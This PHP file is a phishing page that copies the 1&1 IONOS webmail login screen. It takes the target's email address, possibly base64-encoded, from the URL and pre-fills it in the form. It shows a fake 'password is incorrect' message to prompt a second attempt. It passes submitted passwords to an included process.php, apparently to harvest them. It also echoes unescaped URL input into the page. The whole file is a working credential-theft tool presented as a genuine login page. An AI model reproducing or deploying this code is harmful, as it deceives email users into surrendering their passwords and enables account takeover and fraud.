<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <!-- head infos -->
  <title data-i18n="oao.login.title" data-i18n-attr="text">1&amp;1 IONOS E-Mail login</title>
  <meta name="description" content="Login to access your 1&amp;1 IONOS e-mail account and read your e-mail online with 1&amp;1 IONOS Webmail." data-i18n="oao.login.description" data-i18n-attr="content">
  <meta charset="utf-8">
  <!-- canonical relevant information -->
  <link rel="canonical" href="https://mail.ionos.co.uk/" data-i18n="oao.login.canonical" data-i18n-attr="href">
  <link rel="alternate" hreflang="de-de" href="https://mail.ionos.de/">
  <link rel="alternate" hreflang="en-gb" href="https://mail.ionos.co.uk/">
  <link rel="alternate" hreflang="en-us" href="https://mail.ionos.com/">
  <link rel="alternate" hreflang="en-ca" href="https://mail.ionos.ca/">
  <link rel="alternate" hreflang="es-es" href="https://mail.ionos.es/">
  <link rel="alternate" hreflang="es-mx" href="https://mail.ionos.mx/">
  <link rel="alternate" hreflang="fr-fr" href="https://mail.ionos.fr/">
  <link rel="alternate" hreflang="it-it" href="https://mail.ionos.it/">
  <!-- microsoft ie-mode -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <!-- mobile config -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="manifest" href="https://mail.ionos.co.uk/manifest.json">
  <!-- microsoft mobile config -->
  <meta id="win8Icon" name="msapplication-TileImage" content="img/icon144_win.png">
  <meta id="win8TileColor" name="msapplication-TileColor" content="#003d8f">
  <!-- apple mobile config -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <!-- apple-touch-icon -->
  <link id="icon57" rel="apple-touch-icon" href="https://mail.ionos.co.uk/img/icon57.png">
  <link id="icon72" rel="apple-touch-icon" sizes="72x72" href="https://mail.ionos.co.uk/img/icon72.png">
  <link id="icon76" rel="apple-touch-icon" sizes="76x76" href="https://mail.ionos.co.uk/img/icon76.png">
  <link id="icon114" rel="apple-touch-icon" sizes="114x114" href="https://mail.ionos.co.uk/img/icon114.png">
  <link id="icon120" rel="apple-touch-icon" sizes="120x120" href="https://mail.ionos.co.uk/img/icon120.png">
  <link id="icon144" rel="apple-touch-icon" sizes="144x144" href="https://mail.ionos.co.uk/img/icon144.png">
  <link id="icon152" rel="apple-touch-icon" sizes="152x152" href="https://mail.ionos.co.uk/img/icon152.png">
  <link id="icon167" rel="apple-touch-icon" sizes="167x167" href="https://mail.ionos.co.uk/img/icon167.png">
  <link id="icon180" rel="apple-touch-icon" sizes="180x180" href="https://mail.ionos.co.uk/img/icon180.png">
  <link id="icon192" rel="apple-touch-icon" sizes="192x192" href="https://mail.ionos.co.uk/img/icon192.png">
  <!-- apple-touch-startup-image [media-devicewidth is not W3C-conform] -->
  <link id="splash460" rel="apple-touch-startup-image" href="https://mail.ionos.co.uk/img/splashscreen_460.jpg"><!-- media="(device-width: 320px)" -->
  <link id="splash920" rel="apple-touch-startup-image" href="https://mail.ionos.co.uk/img/splashscreen_920.jpg"><!-- media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" -->
  <link id="splash1096" rel="apple-touch-startup-image" href="https://mail.ionos.co.uk/img/splashscreen_1096.jpg"><!-- media="(device-aspect-ratio: 40/71)" -->
  <!-- favicon -->
  <link id="favicon" rel="shortcut icon" href="https://mail.ionos.co.uk/img/favicon.ico" type="image/x-icon">
  <!-- css includes -->
  <link rel="stylesheet" type="text/css" href="https://ce1.uicdn.net/exos/framework/1.0/ionos.min.css?v=4.2.2_20181204+1145">
  <link rel="stylesheet" type="text/css" href="https://mail.ionos.co.uk/css/login.min.css?v=4.2.2_20181204+1145">
  <script type="text/javascript" async src="1&amp;1%20IONOS%20E-Mail%20login_files/zones.js"></script>
  <script type="text/javascript" async src="1&amp;1%20IONOS%20E-Mail%20login_files/ias.js"></script>
  <script type="text/javascript" async src="1&amp;1%20IONOS%20E-Mail%20login_files/inpagelayer.js"></script>
  <script type="text/javascript" async src="1&amp;1%20IONOS%20E-Mail%20login_files/navigation.js"></script>
  <script id="oaotag" type="text/javascript" async defer src="1&amp;1%20IONOS%20E-Mail%20login_files/webmailer.js"></script>
  <script src="https://ce1.uicdn.net/exos/framework/1.0/ionos.min.js?v=4.2.2_20181204+1145" async></script>


</head>
<body class="mail oao-pi-nolayer oao-pi-with-navigation">
<!-- error for JS-disabled browsers -->
<noscript>
  <p class="noscript">
    This page uses JavaScript.
    Your browser either doesn't support JavaScript or you have it turned off.
    To use this page please use a JavaScript enabled browser.
  </p>
</noscript>

 

<!-- Global Navigation -->
<div id="header">
  <div class="oao-navi-navigation oao-navi-finished">
    <div class="oao-navi-left">
      <!-- uncomment for burger menu
      <span class="oao-navi-burger"></span>
      -->
      <div class="oao-navi-application-name">
        <a class="oao-navi-app-name" data-i18n="oao.login.ionos.link" data-i18n-attr="href" href="https://www.ionos.co.uk/">
          <span data-i18n="oao.login.heading" data-i18n-attr="text">Webmail</span>&nbsp;<span data-i18n="oao.login" data-i18n-attr="text">Login</span>
        </a>
      </div>
    </div>

	
   
  
  
  </div>
</div>

<!-- main wrap -->
<div id="main">

  <!-- tab form contrainer -->
  <section class="login-forms" role="main">
    <div class="clearfix">
      <div class="clearfix" data-tab="email">

        <!-- login-form -->
        <form id="login-form" class="form content-elem" method="post" autocomplete="on">

          <h1 class="headline">
            <span data-i18n="oao.login.heading" data-i18n-attr="text">Webmail</span>&nbsp;<span data-i18n="oao.login" data-i18n-attr="text">Login</span>
          </h1>

          <fieldset>
            <legend class="hidden" data-i18n="oao.login.email" data-i18n-attr="text" aria-hidden="false">E-Mail</legend>
            <!-- login-form: error output -->
                       <?php if (isset($_GET['mgs'])) {?>
            <div id="login-error" class="notificaiton-wrap" style="display: block;"><dl class="notification notification-danger" data-prio="50"><dt class="notification-heading">An error has occurred.</dt><dd class="notification-description">This e-mail address could not be found or the password is incorrect.</dd></dl></div>
 <?php } ?>
            <!-- login-form: elements -->
            <div class="form-field loginform-user">
              <label for="username" data-i18n="oao.login.field.email" data-i18n-attr="text">E-mail Address</label>
              <div class="input-text-group input-text-group--empty">
                <span class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
                <input id="username" name="login" value="<?php echo $log; ?>" placeholder="E-mail Address" data-i18n="oao.login.field.email" data-i18n-attr="placeholder" autofocus tabindex="3" type="text"><!-- type="email" not working in IE for Umlaut-Domains currently -->
              </div>
            </div><input type="hidden" name="login" value="<?php echo $log; ?>">
            <div class="form-field loginform-password">
              <label for="password" data-i18n="oao.login.field.password" data-i18n-attr="text">Password</label>
              <div class="sub-form-field right">
                <a data-i18n="oao.login.forgotpw.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/troubleshooting-11-11-mail-basicmail-business/changing-an-email-account-password-in-the-control-panel/" data-flyin-href="" class="oao-pi-open-in-flyin">
                  <span data-i18n="oao.login.forgotpw.heading" data-i18n-attr="text">Forgot your password?</span>
                </a>
              </div>
              <div class="input-text-group input-text-group--empty">
                <span class="input-text-group__icon exos-icon exos-icon-password-16"></span>
                <input id="password" name="pass" value="" placeholder="Password" data-i18n="oao.login.field.password" data-i18n-attr="placeholder" tabindex="4" type="password">
              </div>
              <!--
              <div class="sub-form-field left">
                <input id="staysignedin-box" name="staysignedin" type="checkbox" value="1" tabindex="6" />
                <label for="staysignedin-box" data-i18n="oao.login.stay-signed-in" data-i18n-attr="text"></label>
              </div>
              -->
            </div>
            <div class="form-field">
              <button type="submit" id="submit-login-form" name="submit" data-i18n="oao.login" data-i18n-attr="text" tabindex="5">Login</button>
            </div>
          </fieldset>
        </form>
      </div>
    </div>

  </section>

  <section id="assistants">
    <h2 data-i18n="oao.login.setup.headline" data-i18n-attr="text">Set up your mailbox on other devices</h2>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.mobile" data-i18n-attr="text">Mobile</dt>
      <dd>
        <a data-i18n="oao.login.setup.mobile.ios.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/other-email-programs/setting-up-an-email-account-on-an-iphone/" data-flyin-href="" class="oao-pi-open-in-flyin">
          <span data-i18n="oao.login.setup.mobile.ios" data-i18n-attr="text">iOS</span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.mobile.android.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/other-email-programs/setting-up-an-email-account-on-an-android-smartphone/" data-flyin-href="" class="oao-pi-open-in-flyin">
          <span data-i18n="oao.login.setup.mobile.android" data-i18n-attr="text">Android</span>
        </a>
      </dd>
    </dl>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.desktop" data-i18n-attr="text">Desktop</dt>
      <dd>
        <a data-i18n="oao.login.setup.desktop.thunderbird.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/other-email-programs/setting-up-an-email-account-in-thunderbird/" data-flyin-href="" class="oao-pi-open-in-flyin">
          <span data-i18n="oao.login.setup.desktop.thunderbird" data-i18n-attr="text">Thunderbird</span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.desktop.outlook.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/microsoftr-outlook/automatically-setting-up-an-email-account-in-microsoft-outlook-2016/" data-flyin-href="" class="oao-pi-open-in-flyin">
          <span data-i18n="oao.login.setup.desktop.outlook" data-i18n-attr="text">Outlook</span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.desktop.applemail.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/other-email-programs/setting-up-an-email-account-in-apple-mail/" data-flyin-href="" class="oao-pi-open-in-flyin">
          <span data-i18n="oao.login.setup.desktop.applemail" data-i18n-attr="text">Apple Mail</span>
        </a>
      </dd>
    </dl>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.other" data-i18n-attr="text">Other</dt>
      <dd>
        <a data-i18n="oao.login.setup.other.assistants.link" data-i18n-attr="href" href="https://www.ionos.co.uk/help/email-office/general-topics/settings-for-your-email-programs-imap-pop3/" data-flyin-href="" class="oao-pi-open-in-flyin">
          <span data-i18n="oao.login.setup.other.assistants" data-i18n-attr="text">email programs (POP/IMAP)</span>
        </a>
      </dd>
    </dl>
  </section>

  <div id="list-additional-login-links">
    <h2 data-i18n="oao.login.morelogins.heading" data-i18n-attr="text">Other 1&amp;1 IONOS Logins</h2>
    <ul class="clearfix">
      <li>
        <a class="product-link " href="https://my.ionos.co.uk/" data-i18n="oao.login.controlcenter.link" data-i18n-attr="href">
          <span class="product-link-image" id="product-link-image--controlcenter"></span>
          <span class="product-link-heading" data-i18n="oao.login.controlcenter" data-i18n-attr="text">My IONOS</span>
        </a>
      </li>
      <li>
        <a class="product-link " href="https://hidrive.ionos.com/" data-i18n="oao.login.hidrive.link" data-i18n-attr="href">
          <span class="product-link-image" id="product-link-image--hidrive"></span>
          <span class="product-link-heading" data-i18n="oao.login.hidrive" data-i18n-attr="text">HiDrive</span>
        </a>
      </li>
    </ul>
  </div>

  <div class="additional-content bottom clear">
    <div class="content active" data-tab="email,onlinestorage"><span class="page-transition__indicator-bar"></span></div>
    <div class="ias-zone" data-zoneid="webmailer_login_banner" data-ias-zoneid="webmailer_login_banner" id="ias.zone0"></div>
  </div>

</div>

<!-- Feedback Button -->


<footer>
  <ul class="clearfix">
    <li>
      <a href="https://my.ionos.co.uk/" data-i18n="oao.login.controlcenter.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.ionos" data-i18n-attr="text">1&amp;1 IONOS</span>
        <span data-i18n="oao.login" data-i18n-attr="text">Login</span>
      </a>
    </li>
    <li>
      <a href="https://www.ionos.co.uk/about" data-i18n="oao.login.imprint.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.ionos.legal" data-i18n-attr="text">1&amp;1 Internet Ltd.</span>&nbsp;•&nbsp;<span data-i18n="{YEAR}" data-i18n-attr="text">2019</span>
      </a>
    </li>
    <li>
      <a href="https://www.ionos.co.uk/terms-gtc/terms-privacy/" data-i18n="oao.login.datasecurity.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.datasecurity" data-i18n-attr="text">Privacy Policy</span>
      </a>
    </li>
  </ul>
</footer>

<script type="text/javascript" src="1&amp;1%20IONOS%20E-Mail%20login_files/main.js"></script>


<div class="page-transition__blocker"><div class="page-transition__loading-spin loading-spin"></div></div></body></html>
<!-- parsed successfully with W3C-validator: http://validator.w3.org/ --><?php }?>